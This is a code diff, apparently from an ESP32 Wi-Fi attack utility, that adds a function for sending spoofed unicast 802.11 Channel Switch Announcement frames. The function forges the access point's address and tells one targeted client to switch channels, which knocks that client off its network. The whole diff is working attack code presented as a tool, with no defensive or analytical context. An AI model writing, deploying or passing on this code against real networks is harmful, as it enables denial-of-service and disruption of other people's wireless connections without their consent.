@@ -181,6 +181,40 @@ esp_err_t WifiAttackUtil::channelSwitch(const MacAddr bssid, const char* ssid,
   return ESP_OK;
 }
 
+esp_err_t WifiAttackUtil::channelSwitchUnicast(const MacAddr client, const MacAddr bssid,
+                                               const uint8_t channel, const uint8_t newChannel,
+                                               const uint8_t switchCount)
+{
+  esp_err_t res = _changeChannel(channel);
+  if (res != ESP_OK) return res;
+
+  uint8_t pkt[32];
+  size_t  n = 0;
+  pkt[n++] = 0xD0; pkt[n++] = 0x00;                    // Frame Control: Action
+  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Duration
+  memcpy(&pkt[n], client, 6); n += 6;                  // addr1 = DA = target client
+  memcpy(&pkt[n], bssid,  6); n += 6;                  // addr2 = SA = AP BSSID
+  memcpy(&pkt[n], bssid,  6); n += 6;                  // addr3 = BSSID
+  const size_t seqOff = n;
+  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Sequence Control (per send)
+
+  // Action body: Spectrum Management (cat 0), Channel Switch Announcement (4).
+  pkt[n++] = 0x00; pkt[n++] = 0x04;
+  // Channel Switch Announcement element: mode, new channel, count.
+  pkt[n++] = 0x25; pkt[n++] = 0x03;
+  pkt[n++] = 0x01; pkt[n++] = newChannel; pkt[n++] = switchCount;
+
+  for (int k = 0; k < 3; k++) {
+    uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
+    pkt[seqOff]     = (uint8_t)(sc & 0xFF);
+    pkt[seqOff + 1] = (uint8_t)(sc >> 8);
+    _sequenceNumber++;
+    _sendPacket(pkt, n);
+    vTaskDelay(1 / portTICK_RATE_MS);
+  }
+  return ESP_OK;
+}
+
 esp_err_t WifiAttackUtil::quiet(const MacAddr bssid, const char* ssid,
                                 const uint8_t channel, const uint8_t count,
                                 const uint8_t period, const uint16_t duration,
